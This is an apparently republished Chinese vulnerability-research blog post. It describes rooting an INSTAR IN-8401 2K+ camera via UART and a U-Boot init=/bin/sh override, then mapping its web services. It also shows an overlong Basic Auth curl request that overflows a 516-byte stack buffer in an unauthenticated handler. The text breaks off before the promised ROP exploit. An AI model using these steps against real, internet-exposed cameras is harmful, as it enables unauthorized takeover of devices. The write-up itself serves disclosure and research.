---
title: 无泄漏也能打：INSTAR 摄像头固件到无 ASLR 泄漏 RCE
url: https://mp.weixin.qq.com/s/50SzqdU4bqWqsXU0HSWCYQ
source: Doonsec's feed
date: 2026-09-11
fetch_date: 2026-09-12T06:43:13.565072
---

# 无泄漏也能打：INSTAR 摄像头固件到无 ASLR 泄漏 RCE

# 无泄漏也能打：INSTAR 摄像头固件到无 ASLR 泄漏 RCE

赛博安全攻防日记

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

# 无泄漏也能打：INSTAR 摄像头固件到无 ASLR 泄漏 RCE

上一篇写 ARM 利用时，是对着一个已知漏洞把 exploit 搭起来。这次我想换个更「现代」的 IoT 目标，把链路走完整：固件提取与分析 → 挖到未知漏洞 → 一路打到利用。跟着一起看，怎么在没有地址泄漏的前提下，用 ARM ROP chain 绕过 ASLR，拿下未认证 RCE。

## 目标概览

研究对象是德国厂商 INSTAR 的 IN-8401 2K+ 网络摄像头：带网页配置和实时预览。后来发现这款固件也和其他 2K+ / 4K 系列共用。Shodan 上大约能看到 12,000 台 INSTAR 设备暴露在公网。

![INSTAR IN-8401 2K+ 网页界面](https://mmbiz.qpic.cn/mmbiz_jpg/JdicK53hX84WOMJTjax30OlgicvzXkMwp62nUI6tX0epXO4pYnrC028eaAiaUcoOT1f16sOwiazffYulyXHtdibJicAAYiaj6lUZvZ89ZWW3JH1cj4/640?wx_fmt=jpeg&from=appmsg)

INSTAR IN-8401 2K+ 网页界面

## 撬开外壳：先拿固件

想认真挖洞，得先摸到固件。有了固件才能看二进制、配置、脚本和文件系统布局，静态分析和动态调试才站得住；否则就只能对着网络接口瞎 fuzz。

动手前先尽可能多收集信息。INSTAR 文档挺全，其中一页叫「Restore your HD Camera after a faulty Firmware upgrade」特别有意思：说明摄像头暴露了 UART，还能用来恢复固件镜像。UART 是嵌入式里常见的串口调试接口。文档看起来甚至能直接进 root shell。

文章是写给 HD 型号的，不是我的 2K+，但厂商经常跨代复用硬件和功能，值得一试。拆掉外壳前盖后，调试接口就在 wiki 图示的位置。

接着用 PCBite 夹到接口上，接到 FTDI（USB 转串口）上。

![把 FTDI 接到暴露的 UART 接口](https://mmbiz.qpic.cn/sz_mmbiz_jpg/JdicK53hX84Uw5pyvY4wse8o3YIekmrIIqmbHtywVw6urAGcia1UyFwGq9HmPpos4HI7icXI2txb3sTRut75IeyWono6s7DibhyWgyjegrzXt4U/640?wx_fmt=jpeg&from=appmsg)

把 FTDI 接到暴露的 UART 接口

插到 Linux 机器上打开串口，敲两下，登录提示就出来了：

```
INSTAR login: root
Password:
Login incorrect
```

试了 admin:admin、root:root 这类常见组合，都不行。文档说可以打断启动流程拿 OS 上的 root shell，于是重启摄像头再试。

```
U-Boot 2019.04 (Oct 18 2023 - 11:38:25 +0000)

CPU:   Novatek NT @ 999 MHz
DRAM:  512 MiB
Relocation to 0x1ff3b000, Offset is 0x01f3b000 sp at 1fbf4dc0
nvt_shminfo_init:  The fdt buffer addr: 0x1fbfb8c8
ARM CA9 global timer had already been initiated
otp_init!
120MHz
otp_timing_reg= 0xff6050
 CONFIG_MEM_SIZE                =      0x20000000
 CONFIG_NVT_UIMAGE_SIZE         =      0x01900000
 CONFIG_NVT_ALL_IN_ONE_IMG_SIZE =      0x14a00000
 CONFIG_UBOOT_SDRAM_BASE        =      0x1e000000
 CONFIG_UBOOT_SDRAM_SIZE        =      0x01fc0000
 CONFIG_LINUX_SDRAM_BASE        =      0x01100000
 CONFIG_LINUX_SDRAM_SIZE        =      0x1cf00000
 CONFIG_LINUX_SDRAM_START       =      0x1c700000
[...]
phy interface: INTERNAL MII
eth_na51055
Hit any key to stop autoboot:  0
 do_nvt_boot_cmd: boot time: 1718855(us)
 [...]
```

确实能打断 autoboot，但和文档不一样：打断后进的不是系统 root shell，而是 U-Boot。U-Boot（Universal Bootloader）是嵌入式里常见的开源 bootloader，负责初始化硬件、加载操作系统/固件。

```
nvt@na51055: printenv
arch=arm
[...]
bootargs=console=ttyS0,115200 earlyprintk nvt_pst=/dev/mmcblk2p0
nvtemmcpart=0x40000@0x40000(fdt)ro,0x200000@0xc0000(uboot)ro,0x40000@0x2c0000(uenv),0x400000@0x300000(linux)ro,0x40000000@0xb00000(rootfs0),0xc000000@0x40b00000(rootfs1),0x40000000@0x4cb00000(rootfs2),0x1000000@0x8CF00000(rootfsl1),0x10000000@0x8E300000(rootfsl2),0xe6a340@0(total) root=/dev/mmcblk2p1 rootfstype=ext4 rootwait rw
bootcmd=nvt_boot
[...]
vendor=novatek
ver=U-Boot 2019.04 (Oct 18 2023 - 11:38:25 +0000)
```

注意到内核启动参数来自环境变量 `bootargs`。我试了经典的 `init=/bin/sh`：让内核别跑 init，直接起 shell。改完变量后用 `nvt_boot` 启动。

```
invt@na51055: setenv bootargs "console=ttyS0,115200 earlyprintk nvt_pst=/dev/mmcblk2p0
nvtemmcpart=0x40000@0x40000(fdt)ro,0x200000@0xc0000(uboot)ro,0x40000@0x2c0000(uenv),0x400000@0x300000(linux)ro,0x40000000@0xb00000(rootfs0),0xc000000@0x40b00000(rootfs1),0x40000000@0x4cb00000(rootfs2),0x1000000@0x8CF00000(rootfsl1),0x10000000@0x8E300000(rootfsl2),0xe6a340@0(total) root=/dev/mmcblk2p1 rootfstype=ext4 rootwait rw init=/bin/sh"
nvt@na51055: nvt_boot
[...]
EXT4-fs (mmcblk2p1): recovery complete
EXT4-fs (mmcblk2p1): mounted filesystem with ordered data mode. Opts: (null)
VFS: Mounted root (ext4 filesystem) on device 179:1.
devtmpfs: mounted
Freeing unused kernel memory: 1024K
Run /bin/sh as init process
/bin/sh: can't access tty; job control turned off
/ # id
uid=0(root) gid=0(root)
/ # hostname
INSTAR
```

成了。我加了个新的 root 用户再重启，就能用新账号登录。接着把整棵文件系统 dump 下来做分析和备份——后面万一玩炸了还能还原。

## 高层架构与攻击面

设备打开后很容易被好奇心带着乱跑。目标是找可利用漏洞，得先画一张攻击面地图。

Web 栈里最显眼的是 lighttpd：入口兼反向代理。看配置就能明白，进来的请求会转到对应后端。例如以 `.cgi` 结尾的请求，会经 `/tmp/instt_fcgi.socket` 丢给 `fcgi_server`。

```
fastcgi.server = ( ".cgi" => ((
"bin-path" => "/home/ipc/bin/fcgi_server",
"socket" => "/tmp/instt_fcgi.socket",
"max-procs" => 1,
"check-local" => "disable"
))
```

我更关心**未认证就能摸到的代码**。前期探索知道 Web 用户存在 SQLite 里，负责认证的二进制理应访问这个库；但看不到 `fcgi_server` 在碰它，说明还有别的组件。进程列表里有个 `ipc_server`。挂上 `strace` 后发现：多数接口的请求会从 `fcgi_server` 经 `/tmp/insttv2_socket` 转到 `ipc_server`。

举例：

```
$ curl '192.168.0.3/param.cgi?cmd=mod0&paramkey=paramvalue'
cmd="mod0";
response="204";
```

`ipc_server` 这一侧：

```
recv(91, "\4cmd\0\3\5\0\0\0mod0\0\6param\0\4\32\0\0\0\tparamkey\0\3\v\0\0\0paramvalue\0\7header\0\4\25\0\0\0\3ip\0\3\f\0\0\000192.168.0.1\0", 87, 0) = 87
```

HTTP 请求并不是原样转发，而是先序列化成某种 TLV（Type–Length–Value）结构。认证和核心业务逻辑都在 `ipc_server` 后端。

至此两个有意思的目标清楚了：`fcgi_server` 和 `ipc_server`，都在未认证攻击者的可达范围内。

## 方法论

目标明确后开始挖洞。简单说说用过的方法。

高效挖洞很吃调试环境：静态分析里的假设能马上在动态里验证，也能追调用链。这套和上次研究差不多——摄像头上跑 gdb server，攻击机上 gdb client。

两条主线：fuzzing，以及静态+动态分析结合。先用 boofuzz 对收集到的 Web 接口做了比较「原始」的黑盒 fuzz，扫各种参数看能不能打崩。这条路确实打出了 CVE-2025-8761，但效率很低——从外部几乎只能稳定观察到整机崩溃（后面会解释为什么）。

第二条线花在逆向 `fcgi_server` 和 `ipc_server` 上：搞清逻辑，盯着边界检查、指针运算这些内存破坏常客。节奏通常是：看反编译 → 做假设 → 用 `gdb` / `strace` 动态验证。

## 挖洞过程

先看代码。`fcgi_server` 像一层自定义中间件，把 Web 请求翻译成 ipc 消息。反编译里能看到 `.cgi` 端点的分发器，按 URI 调不同 handler。

![反编译后的 fcgi_server 分发函数](https://mmbiz.qpic.cn/sz_mmbiz_png/JdicK53hX84Via0RC5Hr89ZRWAd4cfwrfWGJ0rhkOyX46Igg4IgRSAJEbicOwNNbs9b0GmHHNnbUfLsZ7eh1UobJnibE9sxKGv0nM12YTeUgLnI/640?wx_fmt=png&from=appmsg)

反编译后的 fcgi\_server 分发函数

多数 handler 里会出现同一类模式：再调一个「像分发器」的函数。我把它识别成认证处理逻辑。

![反编译后的 update 处理函数](https://mmbiz.qpic.cn/sz_mmbiz_png/JdicK53hX84VlJ64AznDdjaLsnoJ9neeb793rEuyvHn1pP3uBricagGd3lWo01rN7yp9XWib6dSb9uMibugf114QHWeyibQbiab756uS9Pc7Hibfds/640?wx_fmt=png&from=appmsg)

反编译后的 update 处理函数

按认证方式不同，提取/序列化 auth 数据的路径也不一样。其中一条是 Basic Auth handler。

![反编译后的认证处理函数](https://mmbiz.qpic.cn/sz_mmbiz_png/JdicK53hX84WSnZtSDqL23DWoDaG3YsibnVFHkHic3LzLqib5vblfpWSgeXh0Tutuica63g5NqtaxufNTSEn56Ribm3qE7ibiaGIZayJuFoILQY5rjo/640?wx_fmt=png&from=appmsg)

反编译后的认证处理函数

Basic Auth handler 里又调了一个看起来像自定义 Base64 解码的函数。反编译里能看到不少 C++ 味道：成员函数、this 指针、标准库引用。多数字符串操作走的是 C++ string；但这里有个 `memcpy`，把 Base64 解码结果拷进栈上固定 516 字节的缓冲区。

![反编译后的 Base64 解码函数](https://mmbiz.qpic.cn/sz_mmbiz_png/JdicK53hX84WQYNnVp9tfmfKemX8u6LELQLobKzNbQMebhoWib5WkQOQn7e7WGnQeHVTIjFDvLflDpaCm0rONuNfjk8MiatYibsHNVxdDDibWM5c/640?wx_fmt=png&from=appmsg)

反编译后的 Base64 解码函数

静态分析先告一段落，转向动态验证 Basic Auth。先确认 Basic Auth handler 和 Base64 解码确实会被触发：下几个断点，发请求。

```
$ curl -k https://192.168.0.3/castore.cgi -u 'A:B' -v
[...]
* Request completely sent off
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
< HTTP/2 500
< content-type: text/plain; charset=utf-8
[...]
< server: lighttpd/1.4.72
```

断点命中，假设成立，返回 500。

再发一条特别长的 Basic Auth，故意超过 Base64 解码里那 516 字节缓冲区。

```
$ curl -k https://192.168.0.3/castore.cgi -u 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:B' -v
[...]
* Request completely sent off
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
< HTTP/2 500
< content-type: text/html
[...]
< server: lighttpd/1.4.72
<
<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
  <title>500 Internal Server Error</title>
 </head>
 <bo...